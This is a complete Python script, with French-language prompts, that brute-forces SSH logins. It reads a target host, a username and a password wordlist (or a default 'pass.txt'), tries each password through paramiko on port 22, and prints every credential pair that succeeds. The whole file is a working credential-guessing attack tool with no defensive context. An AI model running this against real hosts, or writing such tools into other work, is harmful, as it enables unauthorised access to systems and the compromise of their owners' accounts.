#!/usr/bin/python3
import paramiko, sys, os, socket, termcolor

def ssh_connect(passwordlist, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=passwordlist)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = sys.argv[1]
username = str(input("Utilisateur : "))
input_file = input("Dictionnaire de mot de passe : ")
print(termcolor.colored(('------------------------------------------------------------------------------'), 'green'))

if os.path.exists(input_file) == False or '':
    print(termcolor.colored(('[-] Erreur!! Entrer un chemin correct'),'blue'))

    erreur = True
    while erreur:

        input_file1 = input(termcolor.colored(('[?] Utiliser le dictionnaire par defaut ? (O/n) '),'blue'))

        if input_file1 == 'o' or input_file1 == 'O':
            with open("pass.txt", 'r') as file:
                for line in file.readlines():
                    passwordlist = line.strip()
                    try:
                        reponse = ssh_connect(passwordlist)
                        if reponse == 0:
                            print(termcolor.colored(('[+]'+username+' : '+passwordlist),'green'))
                        elif reponse == 1:
                            print(termcolor.colored(('[-] Utilisateur introuvable : '+ passwordlist), 'red'))
                        elif reponse == 2:
                            print(termcolor.colored(('[-] Impossible de se connecter'), 'red'))
                            sys.exit(1)
                    except Exception as e:
                        print(e)
                        pass
            sys.exit(1)
        if input_file1 != 'o' and input_file1 != 'O' and input_file1 !='n' and input_file1 != 'N':
            print("[!!] Choisir O pour oui ou N pour non")
            erreur = True

        if input_file1 == 'n'or input_file1 == 'N':
            print(termcolor.colored(('\n[-] Erreur!!'), 'blue'))
            erreur = False

else:
    with open(input_file, 'r') as file:
        for line in file.readlines():
            passwordlist = line.strip()
            try:
                reponse = ssh_connect(passwordlist)
                if reponse == 0:
                    print(termcolor.colored(('[+]'+username+' : '+passwordlist),'green'))
                elif reponse == 1:
                    print(termcolor.colored(('[-] Utilisateur introuvable : '+ passwordlist), 'red'))
                elif reponse == 2:
                    print(termcolor.colored(('[-] Impossible de se connecter'), 'red'))
                    sys.exit(1)
            except Exception as e:
                print(e)
                pass
